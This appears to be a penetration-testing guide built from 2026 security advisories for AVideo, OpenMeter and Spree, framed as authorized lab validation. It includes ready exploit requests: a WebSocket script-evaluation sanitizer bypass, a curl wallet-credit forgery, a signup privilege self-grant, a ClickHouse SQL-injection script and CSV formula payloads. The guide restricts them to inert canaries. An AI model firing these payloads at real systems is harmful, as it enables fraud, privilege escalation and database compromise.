# AVideo WebSocket/gallery/payment, OpenMeter JSONPath SQLi, and Spree CSV export boundaries

## Operator value

GitHub Advisory Database published a June 4, 2026 batch with reusable testing lessons for authorized web-app and SaaS assessments:

- AVideo YPTSocket issues anonymous WebSocket tokens and reflects connection metadata into admin-facing DOM without safe encoding: [GHSA-8whc-2wmv-ww35](https://github.com/advisories/GHSA-8whc-2wmv-ww35).
- AVideo YPTSocket's SQLite message handler can still deliver `autoEvalCodeOnHTML` when the payload is placed under a higher-priority `json` key instead of the sanitized `msg` path: [GHSA-2fhx-q92v-5fhv / CVE-2026-49279](https://github.com/advisories/GHSA-2fhx-q92v-5fhv).
- AVideo YouTubeAPI and Gallery views render YouTube titles, search strings, and category descriptions into HTML contexts without consistent output encoding: [GHSA-66q5-cj5g-wrfx / CVE-2026-50183](https://github.com/advisories/GHSA-66q5-cj5g-wrfx), [GHSA-hgjh-6wj8-gcgf / CVE-2026-50182](https://github.com/advisories/GHSA-hgjh-6wj8-gcgf), [GHSA-c8h8-vq34-9fw2 / CVE-2026-47694](https://github.com/advisories/GHSA-c8h8-vq34-9fw2).
- AVideo AuthorizeNet credits wallet balance from a client-supplied `amount` while the payment-success path is hardcoded true: [GHSA-9392-pj54-qqf8 / CVE-2026-47696](https://github.com/advisories/GHSA-9392-pj54-qqf8).
- AVideo API signup accepted privilege fields such as `emailVerified`, `canUpload`, `canStream`, and `canCreateMeet` on the CAPTCHA-only anonymous registration path: [GHSA-8j8m-p79x-g4jm / CVE-2026-33684](https://github.com/advisories/GHSA-8j8m-p79x-g4jm).
- OpenMeter meter creation interpolates JSONPath-like `valueProperty` / `groupBy` values into ClickHouse SQL after validation that does not make the value SQL-safe: [GHSA-wc3v-3457-c8cm / CVE-2026-8462](https://github.com/advisories/GHSA-wc3v-3457-c8cm).
- Spree customer export writes user-controlled customer/address fields into CSV cells that spreadsheet software may treat as formulas: [GHSA-xf4v-w5x5-pv79](https://github.com/advisories/GHSA-xf4v-w5x5-pv79).

The durable pattern: sinks often sit behind feature plugins, export jobs, WebSocket helper paths, or data-shaping fields that teams treat as internal plumbing. During a pentest, validate whether attacker-controlled bytes can cross those boundaries with a canary value and produce a privileged browser, billing, database, or desktop effect.

## Affected surfaces

| Surface | Affected versions | Fixed version | Boundary to test |
| --- | --- | --- | --- |
| AVideo / API / YPTSocket / YouTubeAPI / AuthorizeNet / Gallery | `WWBN/AVideo <= 29.0` in the older plugin advisories; `wwbn/avideo < 29.0` for signup permission self-grant | `29.0` for GHSA-8j8m-p79x-g4jm; no patched composer version listed for several older plugin advisories at publication time | anonymous or low-privileged input to account permissions, admin DOM, WebSocket evaluation, wallet credits, or gallery HTML |
| OpenMeter | `github.com/openmeterio/openmeter < 1.0.0-beta.228` | `1.0.0-beta.228` | authenticated tenant-supplied JSONPath to shared ClickHouse query text |
| Spree | `spree >= 5.2.0 < 5.2.8`, `>= 5.3.0 < 5.3.6`, `>= 5.4.0 < 5.4.3` | `5.2.8`, `5.3.6`, `5.4.3` | public customer fields to administrator-opened CSV export |

## Recon workflow

1. Confirm the program explicitly allows testing of plugin behavior, payment workflows, multi-tenant analytics, exports, and administrator-facing browser effects. Do not test real payment processors or trigger live admin sessions without written authorization.
2. Identify relevant packages from lockfiles, SBOMs, container images, and exposed app fingerprints:

   ```bash
   grep -R "WWBN/AVideo\|wwbn/avideo\|openmeterio/openmeter\|spree" \
     composer.lock go.mod Gemfile.lock package.json 2>/dev/null
   ```

3. For AVideo targets, only proceed past version triage when the relevant feature is reachable: API signup, `YPTSocket`, `YouTubeAPI`, `AuthorizeNet`, `YPTWallet`, or `Gallery`. A version-only report is weak without the enabled feature and vulnerable code path.
4. For OpenMeter, confirm the tenant model and whether low-privileged tenants can create meters. The high-value issue is cross-tenant data impact from a shared ClickHouse backend, not a standalone timing artifact.
5. For Spree, map whether public signup or customer self-service profile fields feed an administrator export workflow. The reportable boundary is customer-originated cell content reaching spreadsheet execution contexts.

## Safe validation patterns

### June 22 Authorize.Net webhook and Docker dotfile update

The June 22 scan added two AVideo operator checks that belong with this existing payment/plugin page rather than a duplicate alert:

- [GHSA-95jh-7r58-xmxw](https://github.com/advisories/GHSA-95jh-7r58-xmxw) / CVE-2026-33731: the Authorize.Net webhook path could treat a real transaction lookup as enough to continue even when the webhook signature was invalid, then trust attacker-controlled payload values for `amount` and `metadata.users_id`.
- [GHSA-wf69-r4mx-43rr](https://github.com/advisories/GHSA-wf69-r4mx-43rr) / CVE-2026-33692: the official Docker Compose layout mounted the project root into the Apache document root, making `.env` reachable as a static file in default deployments.

Operator value: payment integrations and containerized web-app defaults need separate checks for **signed processor event to local wallet credit** and **deployment file to public static route**. Keep both proofs in a lab or explicit test merchant environment.

Safe validation boundaries:

1. For Authorize.Net, use a sandbox merchant and disposable wallet. Send a paired baseline legitimate sandbox event and a canary event with an invalid signature but a real sandbox transaction ID. Report only whether the app rejects the invalid signature before wallet mutation; do not inflate real balances, target other users, or race production webhooks.
2. For payload precedence, compare the processor-fetched amount/user with the webhook payload amount/user using tiny synthetic values. Positive evidence is a lab ledger entry showing the payload won over authoritative processor data.
3. For Docker dotfiles, request only a synthetic `.env` in a disposable deployment or a canary hidden file containing no secrets. Evidence should show route reachability and headers/body marker presence, not real credentials.
4. Negative controls: unconditional signature rejection before transaction enrichment, processor API values overriding payload values, approval/status checks before `processSinglePayment()`, dotfile deny rules, and web roots that exclude project/config directories.

### AVideo WebSocket metadata to admin DOM

Use an owned lab or a test admin browser. The canary should prove DOM interpretation without stealing cookies or triggering account actions.

1. Confirm `YPTSocket` is enabled and an unauthenticated caller can obtain a WebSocket token from the lab target.
2. Connect with a `page_title` canary that is visually obvious and harmless, such as an inert image-error marker that writes to `console.log`.
3. Observe whether an authenticated test-admin page rendering the online-users/debug panel receives and parses that canary as HTML.

Evidence should include the token-issuance response shape, the WebSocket URL with sensitive tokens redacted, the received broadcast field, and a screenshot or DOM snippet showing canary execution in the test account only.

### AVideo WebSocket message-key priority bypass

Look for patches that remove dangerous keys only from one object path. In a lab, send paired WebSocket messages that differ only in key placement:

```json
{"msg":{"autoEvalCodeOnHTML":"console.log('sanitized-canary')"}}
{"json":{"autoEvalCodeOnHTML":"console.log('priority-canary')"},"msg":"decoy"}
```

A strong finding shows that the `msg` path is stripped while the `json` path is delivered or evaluated. Do not use payloads that read cookies, local storage, messages, or private user data.

### AVideo payment-credit trust boundary

Only validate against a disposable lab wallet or explicit test merchant environment. The minimum safe proof is a tiny canary amount and before/after balance evidence:

```bash
curl -i -s -b 'PHPSESSID=TEST_USER_SESSION' \
  -X POST 'https://avideo.example.test/plugin/AuthorizeNet/processPayment.json.php' \
  --data 'amount=0.01&userData[note]=skillz-canary'
```

Report this only if the response and wallet ledger prove a credit occurred without a real payment token, processor transaction ID, signed webhook, server-side order record, or replay guard.

### AVideo signup permission mass-assignment boundary

Use only a disposable lab instance or an explicit bug-bounty scope that permits account-registration testing. The valuable proof is that anonymous self-service signup can set server-trusted capability flags that should require an API secret or administrator action.

1. Create two registration attempts with the same CAPTCHA flow: one baseline without privilege fields and one canary request that includes only harmless capability flags needed for evidence.
2. Keep the account identity disposable and unique. Do not try to impersonate existing users or bypass CAPTCHA providers outside the program's allowed workflow.
3. After registration, inspect only the new test account's profile, API response, or low-risk feature gates to confirm whether `emailVerified`, upload, stream, or meet permissions were granted.

Example canary shape for a lab target:

```bash
curl -i -s 'https://avideo.example.test/plugin/API/set.json.php' \
  -X POST \
  --data 'APIName=signUp' \
  --data 'user=skillz_canary_001' \
  --data 'pass=DisposablePassword123!' \
  --data 'email=skillz-canary-001@example.invalid' \
  --data 'name=Skillz Canary' \
  --data 'captcha=VALID_LAB_CAPTCHA_TOKEN' \
  --data 'emailVerified=1' \
  --data 'canUpload=1' \
  --data 'canStream=1' \
  --data 'canCreateMeet=1'
```

Strong evidence includes the registration response, the absence of a valid `APISecret`, the CAPTCHA validation path, and a before/after capability comparison for the disposable account. Stop at capability proof; do not upload real media, start public streams, create meetings with real users, or use the elevated account to touch production content.

### AVideo gallery and third-party content encoding

Prefer source review plus a harmless rendering canary. Test each context independently: attribute, element body, hidden container, and pagination `href`.

```text
skillz-canary-<random>"><b data-skillz="canary">skillz</b>
```

A reportable issue should identify the exact source field (`search`, YouTube `snippet.title`, category description), the sink template, and the browser-parsed DOM. Avoid payloads that execute JavaScript on real users.

### OpenMeter JSONPath-to-SQL boundary

In an authorized lab tenant, use a time-delay canary to distinguish SQL interpretation from validation failure. Keep the delay small and run it against a local or test instance.

```python
import json, time, uuid
from urllib.request import Request, urlopen

api = "http://localhost:48888"
payload = "$.foo') UNION ALL SELECT toString(sleep(2)) FROM system.one --"
body = json.dumps({
    "slug": f"skillz_canary_{uuid.uuid4().hex[:8]}",
    "eventType": "skillz_canary",
    "aggregation": "SUM",
    "valueProperty": payload,
}).encode()
req = Request(f"{api}/api/v1/meters", data=body,
              headers={"Content-Type": "application/json"}, method="POST")
t0 = time.monotonic()
with urlopen(req, timeout=8) as r:
    print(r.status, round(time.monotonic() - t0, 3))
```

The advisory notes that the payload needs a syntactically valid JSONPath prefix such as `$.foo` before the quote. Evidence should include baseline timing, injected timing, the request body, and proof that the account used had only tenant-level permissions.

### Spree CSV formula injection

Use formula strings that visibly render as a formula without reaching out to external infrastructure:

```text
=HYPERLINK("https://example.invalid/skillz-canary","skillz-canary")
+SUM(1,1)
@SUM(1,1)
```

Create or update a test customer, request the customer export through an authorized admin/test workflow, and open the file in a safe spreadsheet environment with external links/macros disabled. Capture the raw CSV cell and the spreadsheet interpretation. Do not use DDE or command-execution formula payloads against real administrators.

## Evidence to capture

- Advisory ID, package version, enabled feature/plugin, and how the version was verified.
- The exact source-to-sink path: request parameter, WebSocket field, customer profile value, meter JSONPath, or export field.
- Minimal canary request and response output, with tokens, cookies, customer data, and secrets redacted.
- For browser issues: DOM evidence from a test account, not data from real administrators or customers.
- For payment or tenant-data issues: proof of impact using disposable lab records only.

## Report framing

Frame these as boundary failures rather than generic vulnerable-version findings:

- AVideo: feature-plugin and API plumbing lets unauthenticated, low-privileged, or third-party content become trusted account-permission, browser/script, or payment state.
- OpenMeter: JSONPath validation does not make a string safe for SQL construction in a shared analytics datastore.
- Spree: customer-originated data crosses into an administrator desktop execution context through CSV export.

Impact should be tied to the concrete enabled feature and demonstrated canary effect. Keep payloads inert and avoid collecting sensitive data.

## Sources

- GitHub Advisory Database: [GHSA-8whc-2wmv-ww35](https://github.com/advisories/GHSA-8whc-2wmv-ww35)
- AVideo project advisory: [GHSA-8whc-2wmv-ww35](https://github.com/WWBN/AVideo/security/advisories/GHSA-8whc-2wmv-ww35)
- GitHub Advisory Database: [GHSA-2fhx-q92v-5fhv / CVE-2026-49279](https://github.com/advisories/GHSA-2fhx-q92v-5fhv)
- AVideo project advisory: [GHSA-2fhx-q92v-5fhv](https://github.com/WWBN/AVideo/security/advisories/GHSA-2fhx-q92v-5fhv)
- GitHub Advisory Database: [GHSA-66q5-cj5g-wrfx / CVE-2026-50183](https://github.com/advisories/GHSA-66q5-cj5g-wrfx)
- GitHub Advisory Database: [GHSA-hgjh-6wj8-gcgf / CVE-2026-50182](https://github.com/advisories/GHSA-hgjh-6wj8-gcgf)
- GitHub Advisory Database: [GHSA-c8h8-vq34-9fw2 / CVE-2026-47694](https://github.com/advisories/GHSA-c8h8-vq34-9fw2)
- GitHub Advisory Database: [GHSA-9392-pj54-qqf8 / CVE-2026-47696](https://github.com/advisories/GHSA-9392-pj54-qqf8)
- GitHub Advisory Database: [GHSA-8j8m-p79x-g4jm / CVE-2026-33684](https://github.com/advisories/GHSA-8j8m-p79x-g4jm)
- AVideo project advisory: [GHSA-8j8m-p79x-g4jm](https://github.com/WWBN/AVideo/security/advisories/GHSA-8j8m-p79x-g4jm)
- GitHub Advisory Database: [GHSA-wc3v-3457-c8cm / CVE-2026-8462](https://github.com/advisories/GHSA-wc3v-3457-c8cm)
- OpenMeter project advisory: [GHSA-wc3v-3457-c8cm](https://github.com/openmeterio/openmeter/security/advisories/GHSA-wc3v-3457-c8cm)
- GitHub Advisory Database: [GHSA-xf4v-w5x5-pv79](https://github.com/advisories/GHSA-xf4v-w5x5-pv79)
- Spree project advisory: [GHSA-xf4v-w5x5-pv79](https://github.com/spree/spree/security/advisories/GHSA-xf4v-w5x5-pv79)
